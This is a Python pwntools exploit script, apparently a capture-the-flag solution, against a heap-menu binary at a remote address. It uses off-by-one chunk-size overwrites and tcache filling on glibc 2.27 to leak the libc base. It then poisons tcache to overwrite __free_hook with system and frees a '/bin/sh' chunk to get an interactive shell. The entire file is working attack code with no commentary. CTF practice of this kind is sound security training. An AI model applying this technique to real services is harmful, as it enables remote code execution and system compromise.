from pwn import *

def new_(index,size):
	r.recvuntil(b":")
	r.sendline(b"1")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Size ")
	r.sendline(str(size))
	return
def edi_(index,content):
	r.recvuntil(b":")
	r.sendline(b"2")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Content: ")
	r.send(content)
	return

def show_(index):
	r.recvuntil(b":")
	r.sendline(b"3")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	r.recvuntil(b"Content: ")
	return

def del_(index):
	r.recvuntil(b":")
	r.sendline(b"4")
	r.recvuntil(b"Index: ")
	r.sendline(str(index))
	return

#r=process("./pwn")
r=remote("39.107.58.236",46653)
pause()
context.log_level='debug'
new_(0,0x18)
new_(1,0x50)
new_(2,0x80)

new_(31,0xe0)
new_(30,0xe0)
new_(29,0xe0)
new_(28,0xe0)
new_(27,0xe0)
new_(26,0xe0)
new_(25,0xe0)
del_(31)
del_(30)
del_(29)
del_(28)
del_(27)
del_(26)
del_(25)

edi_(0,b'a'*0x18+b"\xf1")

del_(1)

new_(31,0xe0)
new_(30,0xe0)
new_(29,0xe0)
new_(28,0xe0)
new_(27,0xe0)
new_(26,0xe0)
new_(25,0xe0)

new_(1,0x80)
new_(3,0x50)


del_(31)
del_(30)
del_(29)
del_(28)
del_(27)
del_(26)
del_(25)

new_(31,0x80)
new_(30,0x80)
new_(29,0x80)
new_(28,0x80)
new_(27,0x80)
new_(26,0x80)
new_(25,0x80)
del_(31)
del_(30)
del_(29)
del_(28)
del_(27)
del_(26)
del_(25)

del_(2)

show_(1)

libc_base=u64(r.recvuntil(b"1.")[:-3].ljust(8,b"\x00"))-0x3EBD80
print(hex(libc_base))


new_(5,0x18)
new_(6,0x18)
new_(7,0x10)
new_(8,0x10)

pause()
edi_(5,b'a'*0x18+b"\x41")
del_(6)
pause()
new_(6,0x2f)
del_(8)
del_(7)
libc=ELF("./libc-2.27.so")
free_hook_add=libc_base+libc.sym["__free_hook"]
pay=b'a'*0x18+p64(0x21)+p64(free_hook_add)+b'a'*0x8
edi_(6,pay)
pause()
new_(9,0x10)
new_(10,0xf)
pay2=p64(libc.sym["system"]+libc_base)+b"\x00"*0x8
edi_(10,pay2)

new_(11,0x4f)
edi_(11,b"/bin/sh\x00".ljust(0x50,b'a'))
del_(11)

r.interactive()

